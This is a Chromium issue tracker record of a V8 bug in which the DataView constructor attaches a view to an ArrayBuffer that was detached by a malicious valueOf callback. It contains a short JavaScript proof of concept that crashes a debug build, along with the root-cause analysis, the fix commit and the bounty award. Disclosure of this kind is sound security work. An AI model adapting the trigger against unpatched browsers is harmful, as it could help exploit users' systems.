# Incorrect implementation of the track-array-buffer-views feature leads to a crash

| Field | Value |
|-------|-------|
| **Issue ID** | [506855825](https://issues.chromium.org/issues/506855825) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | jg...@chromium.org |
| **Created** | 2026-04-27 |
| **Bounty** | $8,000.00 |

## Description

## DETAILS

The execution flow of `new DataView(ab, 0, evil_obj);` is as follows:

1. `array_buffer->was_detached()` checks whether the buffer has been detached — the PoC passes this check.
2. Subsequently, `Object::ToIndex(isolate, byte_length, ...)` triggers `evil_obj.valueOf()`, causing `ab` to be detached.
3. A `JSDataView` object is created.
4. `array_buffer->AttachView(*data_view)` is called — note: this step registers `data_view` into an already-detached `array_buffer`.
5. `array_buffer->was_detached()` is checked again: an exception is thrown here, but it is too late, because the `views` field of `array_buffer` has already been written.

```
BUILTIN(DataViewConstructor) {
  ...

  // 4. If IsDetachedBuffer(buffer) is true, throw a TypeError exception.
  if (array_buffer->was_detached()) {
    THROW_NEW_ERROR_RETURN_FAILURE(
        isolate,
        NewTypeError(
            MessageTemplate::kTypedArrayDetachedErrorOperation,
            isolate->factory()->NewStringFromAsciiChecked(kMethodName)));
  }
  ...

  // 7. Let bufferIsResizable be IsResizableArrayBuffer(buffer).
  // 8. Let byteLengthChecked be empty.
  // 9. If bufferIsResizable is true and byteLength is undefined, then
  //       a. Let viewByteLength be auto.
  // 10. Else if byteLength is undefined, then
  //       a. Let viewByteLength be bufferByteLength - offset.
  size_t view_byte_length;
  bool length_tracking = false;
  if (IsUndefined(*byte_length, isolate)) {
    view_byte_length = buffer_byte_length - view_byte_offset;
    length_tracking = array_buffer->is_resizable_by_js();
  } else {
    // 11. Else,
    //       a. Set byteLengthChecked be ? ToIndex(byteLength).
    //       b. Let viewByteLength be byteLengthChecked.
    //       c. If offset + viewByteLength > bufferByteLength, throw a
    //          RangeError exception.
    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
        isolate, byte_length,
        Object::ToIndex(isolate, byte_length,    // <=== Triggers evil_obj.valueOf()
                        MessageTemplate::kInvalidDataViewLength));
    ...
    view_byte_length = Object::NumberValue(*byte_length);
  }

  bool is_backed_by_rab =
      array_buffer->is_resizable_by_js() && !array_buffer->is_shared();

  // 12. Let O be ? OrdinaryCreateFromConstructor(NewTarget,
  //     "%DataViewPrototype%", «[[DataView]], [[ViewedArrayBuffer]],
  //     [[ByteLength]], [[ByteOffset]]»).
  DirectHandle<JSObject> result;

  if (is_backed_by_rab || length_tracking) {
    ...
  } else {
    // Create a JSDataView.
    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
        isolate, result,
        JSObject::New(target, new_target, {},
                      NewJSObjectType::kMaybeEmbedderFieldsAndApiWrapper));
  }
  auto data_view = Cast<JSDataViewOrRabGsabDataView>(result);
  ...

  // Attach
  array_buffer->AttachView(*data_view); // <== Root Cause

  // 13. If IsDetachedBuffer(buffer) is true, throw a TypeError exception.
  if (array_buffer->was_detached()) {    // <=== Throw exception
    THROW_NEW_ERROR_RETURN_FAILURE(
        isolate,
        NewTypeError(
            MessageTemplate::kTypedArrayDetachedErrorOperation,
            isolate->factory()->NewStringFromAsciiChecked(kMethodName)));
  }
  ...
}

```

commit `a08ad9c9c382b93980a7e76e65594a734cecadda` introduced this vuln.

Fix suggestion: Move `array_buffer->AttachView(*data_view);` to after the `13. If IsDetachedBuffer(buffer)` check.

## REPRODUCE

poc.js:

```

const ab = new ArrayBuffer(64);
let typedArray = new Uint8Array(ab);

const evil_obj = {
    valueOf() {
        ab.transfer();
        return 3;
    },
};
let view = new DataView(ab, 0, evil_obj);

```

V8 must be built with a debug configuration. Execute V8 as follows:

```
../x64.debug/d8 \
    --verify-heap \
    --track-array-buffer-views \
    ./poc.js

```

This will result in the following crash:

```
#
# Fatal error in ../../src/diagnostics/objects-debug.cc, line 2903
# Check failed: views.GetHeapObjectAssumeWeak() == view (0x2c7e0104b635 <DataView map = 0x2c7e01029c21> vs. 0x2c7e0104b561 <Uint8Array map = 0x2c7e01039d11>).
#
#

```

CREDIT INFORMATION

Reporter credit: [303f06e3]

## Timeline

### ch...@google.com (2026-04-28)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### cl...@appspot.gserviceaccount.com (2026-04-28)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6533929016262656.

### ar...@google.com (2026-04-28)

Thanks for the report. I can reproduce it locally and on CF, since this seems to only crash during heap verification do you have a PoC that crashes on ASan release builds?

### 24...@project.gserviceaccount.com (2026-04-28)

Detailed Report: https://clusterfuzz.com/testcase?key=6533929016262656

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: CHECK failure
Crash Address: 
Crash State:
  views.GetHeapObjectAssumeWeak() == view in objects-debug.cc
  v8::internal::JSTypedArray::JSTypedArrayVerify
  v8::internal::JSDetachedTypedArray::JSDetachedTypedArrayVerify
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=106776:106777

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6533929016262656

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### ar...@google.com (2026-04-29)

Bisects to [crrev.com/c/7784472](https://crrev.com/c/7784472), Jakob CYPTAL?

### ch...@google.com (2026-04-29)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-04-29)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### jg...@chromium.org (2026-04-30)

The OP has the correct blame at `a08ad9c9c382b93980a7e76e65594a734cecadda`. It was an easy fix though, in flight.

### dx...@google.com (2026-04-30)

Project: v8/v8  

Branch:  main  

Author:  Jakob Linke [jgruber@chromium.org](mailto:jgruber@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7806344>

[array-buffer] Defer AttachView in DataView ctor past detach check

---


Expand for full commit details
```
     
    The DataView constructor registered the new view on the underlying 
    ArrayBuffer (via AttachView) before the second IsDetachedBuffer 
    check. If the byteLength arg's valueOf (or new.target.prototype's 
    getter) detached the buffer, AttachView ran on a detached buffer 
    and the orphan view leaked into its `views` field even though the 
    constructor threw, violating the tracking invariant verified by 
    --verify-heap. 
     
    Move AttachView to immediately after the second IsDetachedBuffer 
    check. The remaining constructor steps (ArrayBufferByteLength read, 
    RAB offset/length range checks) cannot run user code, so the buffer 
    cannot become detached past that point. 
     
    AttachView must still run before those RAB range checks: if we 
    deferred it further and one of them threw on a resized-but-not- 
    detached buffer, the orphan view would have `views == kNoView` 
    while WasDetached() is false, which violates 
    CheckArrayBufferViewTrackingConsistency (see test262 
    DataView/custom-proto-access-resizes-buffer-*). 
     
    Fixed: 506855825 
    Change-Id: Ib65499805b5e75b09c999e3c0e07dfac49f575d9 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7806344 
    Auto-Submit: Jakob Linke <jgruber@chromium.org> 
    Reviewed-by: Olivier Flückiger <olivf@chromium.org> 
    Commit-Queue: Olivier Flückiger <olivf@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106956}

```

---

Files:

- M `src/builtins/builtins-dataview.cc`
- A `test/mjsunit/regress/regress-506855825.js`

---

Hash: [33395e4fe24b9dc5b435db658d992f68c758af43](https://chromiumdash.appspot.com/commit/33395e4fe24b9dc5b435db658d992f68c758af43)  

Date: Thu Apr 30 07:32:00 2026


---

### ol...@chromium.org (2026-04-30)

this is not unflagged yet. behind --future

### 24...@project.gserviceaccount.com (2026-05-01)

ClusterFuzz testcase 6533929016262656 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=106955:106956

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### sp...@google.com (2026-05-05)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $8000.00 for this report.

Rationale for this decision:
Baseline with bisect. Memory corruption in a sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### eb...@google.com (2026-08-13)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/506855825)*
